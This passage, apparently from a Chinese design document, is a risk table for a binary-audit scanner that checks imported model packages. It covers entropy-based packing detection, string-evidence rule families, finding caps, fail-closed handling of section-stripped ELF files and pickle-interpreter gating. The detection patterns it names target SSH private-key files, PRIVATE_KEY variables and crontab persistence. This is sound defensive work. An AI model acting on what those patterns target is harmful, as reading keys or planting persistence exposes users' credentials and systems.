| 加壳判定对 UPX 打包的合法库误报 | `BIN_001` 定为 HIGH，但触发它的是一次**测量**而不是一次模式匹配：只有可执行节区的熵越过 7.5 bits/byte 才成立，而实测**宿主上 600 个共享对象**（去重后 538 个 ELF，枚举到 2027 个文件条目）的可执行节区最高只有 **6.777009**（**`libcrypto.so.3` 的 `.text`**，3347362 字节，整节读完；`libgomp.so` 的 7.97 落在非可执行的 `.gnu_debugdata`，抽取器根本不测），余量 **0.723** bits。误报面因此是「真的加壳了的合法库」，而不是「碰巧含有某个字节序列的库」；而这一面在已测的 600 个共享对象上是空的——0 个被判结构性、0 个无节表、0 个报错、命中 0 个，最高 6.777009 对阈值 7.5（早先只量了 ollama 那 28 个，最高 6.75，样本扩大二十倍最高值只挪了不到 1%）。**代价必须写清楚：`BIN_001` 是 HIGH，assist（默认策略）下照样阻断**——assist 的通过判据是 `passed = stats.High == 0`（`audit.go:303-304`），而且 assist 的静态判定连 LLM 降级都不认：`recalculateStaticPassed` 存在的唯一理由就是挡住被 LLM 降成 SUSPICIOUS/BENIGN 的静态 HIGH（`verifier.go:204-210`），所以即使 Tier 2 判它 BENIGN 也救不回这个包。也就是说，一个真的用 UPX 打包的合法库会被删包，这正是下一行「二进制通道让原本能导入的包被误阻断」所写的「最贵的失败模式是删包」。之所以保留 HIGH 而不退回 MEDIUM：这条判定由一次**测量**触发、其误报面实测为 0（600 个共享对象命中 0 个），而把一个加壳 `.so` 塞进模型包本身就是经典规避手法，值得用一个删包级判定挡住。 |
| 字符串证据把合法包判成恶意 | 这是本轮实测出的最贵的误报源，对策是把字符串半边整体降级并收窄：源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` 是 HIGH/MEDIUM（`DefaultRules()` + `audit.go:242-243`，MEDIUM 在 `gate` 下照样阻断，`audit.go:301`），所以字符串半边不借它们，改用独立的 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`；每个 token 两端都锚定（`^…$`）以拒绝 `.pyc` 常量池里拼接出的片段（`'crontabz'`、`.profilez /etc/cron)` 都是实测命中），`'.ssh/id_rsaz'` 则靠**闭合的键名列表**（`id_(?:rsa|dsa|ecdsa|ed25519)`）拒绝——单靠 `$` 不够，`id_[a-z]+` 会把结尾的 `z` 一并吃下，锚点照样满足；`ENV_002` 去掉 `(?i)`，否则小写标识符 `private_key` 会撞上 `PRIVATE_KEY`；`OBF_001` 从二进制臂整体删除（28 个合法库命中 23 个）。LOW 仍进报告、仍送 Tier 2 复核，只是自己不足以阻断 |
| 二进制 finding 挤占 LLM 配额 | 两臂各自限流（源码 200、二进制 50），合并列表不再二次截断。**Tier 2 调用上界由 200 变为 250**，且只在两臂同时饱和时可达。反过来，共享配额会让大源码臂按路径序挤掉二进制 finding，而那条路只会更贵：被挤掉的是二进制通道的证据，而挤掉它的那条臂本来就已经有 finding |
| 二进制通道让原本能导入的包被误阻断 | 这是本设计最贵的失败模式（`ProvesCleanScan` 为假 → `cleanDirContents` 删包），所以：**finding 上限不参与完整性**（触顶只写 `findings_capped`/`findings_dropped`，绝不折进 `Report.Truncated`，且 cap 只丢 LOW——能阻断的 HIGH（`assist` 与 `gate`）与 MEDIUM（`gate`）无论预算如何都保留）；纯数据文件的证据截断只记录、不阻断；字符串证据一律 LOW（四个独立族，不借源码臂的 HIGH/MEDIUM id）；`BIN_001` 只由测量触发、不匹配字面量；**ELF 的结构性 fail-closed 只设在"这次没读完"上，不设在"这个文件很大"上**——一个可执行节在每文件 `MaxStreamBytes`（3 GiB）预算内没读完，记为结构性缺口（`section .text declares N bytes, M readable`）并删包；被删掉的 `MaxSectionBytes`（16 MiB/节）为什么错，判据正在这个分界上：16 MiB 的节上限问的是"这个库是不是太大"，而任何足够大的 `.so` 都会越过某个固定值，于是它把"库比较大"变成阻断理由（实测 libLLVM/libclang/chrome/wireshark 的可执行节都越过它）；3 GiB 的每文件预算问的是"我们能不能把它读完"，实测 600 个共享对象（538 个不同 ELF、2027 个文件条目）里没有一个接近它，触到它意味着这次读取确实没完成——那才是诚实的缺口；`security.binaryAudit.enabled=false` 是逐字节回滚。已入库语料实测最大 finding 数为单样本 7、整语料 80，离两个上限都有一个数量级 |
| 去掉无节表 fail-open 后，节表被剥离的合法库被误阻断 | 这是本次修订**新引入**的代价，必须与上一行（UPX / `BIN_001`）并列看，而不是只留在 Task 5 的实现里：熵检测的输入是可执行节，而 `len(ef.Sections) == 0` 的文件（`strip --strip-section-headers` 或 `objcopy --strip-section-headers` 的产物、以及某些加壳器的输出）没有可执行节可测，新实现记为 `Bound.Structural`，而 `KindELF` 是可执行类型，于是这个包被删。旧行为是"没有节表就直接掉出去、不产生任何行也不产生任何 bound"，也就是把"从未检查过"报成"没发现加壳"（fail-open）；本版刻意翻成 fail-closed，判据是：**对可执行格式，"没看"必须不等于"干净"**。这条误报面**不靠"用 `PT_DYNAMIC` 回补 `DT_NEEDED`/`DT_SONAME`"来修**——那条链要先把 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移、再把 `DT_STRTAB` 的虚地址同样映射一次，是一段独立的新解析逻辑，而它的产出对"有没有被加壳"不提供任何证据，与这条误报面无关。真正的取舍是"宁可为被剥节的库删包，也不让一个剥了节表头的加壳载荷通过"。已入库语料实测没有这个形状（`models/` 下一个真实 `.so` 都没有，见第 14 条），宿主 600 个共享对象（538 个不同 ELF、2027 个文件条目）里也 0 个无节表（见第 15 条），所以这个代价目前是**潜伏**的，只在包带上一个被剥节的真实库时发作；`security.binaryAudit.enabled=false` 仍是逐字节回滚 |
| 与 semgrep 非劣性证据的交互 | 二进制通道在**两个臂之外**运行且合并发生在引擎报告之后，两臂的引擎级报告逐字节不变；`corpus_parity_test.go` 会证明这一点 |
| pickle 解释器的门控开错方向 | 两个方向都是故障，所以各有一个测试钉住：**跑宽了**（对非 pickle 也跑解释器）会让任意字节能被读成 opcode，未知 opcode 直接置 `Bound.Structural`，而 `KindELF`/`KindPickle`/`KindArchive`/`KindCompressed` 都是可执行类型，于是每个 `.pt`/`.whl`/`.so` 都被阻断、原本能导入的包被删——`TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles` 用一个良性 ELF 夹具断言既不 `Err` 也无 `Bound.Structural`、无 `SourcePickle` 行；**跑窄了**（该跑的没跑）会丢掉 pickle 证据——`TestPickleInterpreterReadsTheRealCheckpoint` 断言真 checkpoint 仍产出目标。门控规则（只跑在 `KindPickle` 的整文件/容器成员、以及解压后头部嗅探为 pickle 的 gzip 流上）写在 Task 4 Step 4，不得"简化"掉 |
| 二进制通道无法被取消，且它的失败会删包 | `GenerateAuditReport` 由 `internal/controller/import_processing.go:642` 以 `context.Background()` 调用，新增的 `runBinaryChannel`/`ScanDirectory` 都不收 context，所以**单个文件**的工作量被 `BinaryConfig` 的上限钉住，而**总**工作量随文件数线性增长，且没有任何东西能中断它。这是既有的形状而不是新引入的类别——`engine.ScanDirectoryWithLines` 同样不收 context——所以这里只当作一个已知边界记录：一次导入的二进制臂时长与文件数成正比，超时与否只能由调用方在整条审计之外控制，本计划不新增逐文件的取消路径。同一个 `context.Background()` 调用点也是**为什么 `runBinaryChannel` 不返回 error**：`internal/controller/import_processing.go:642-660` 对任何 error 都走删包，逐文件失败（已计为 `Incomplete`）或整趟失败（已计为 `Errored`）若从那条路出去，报告根本没机会说明原因，删除也就无从复核 |
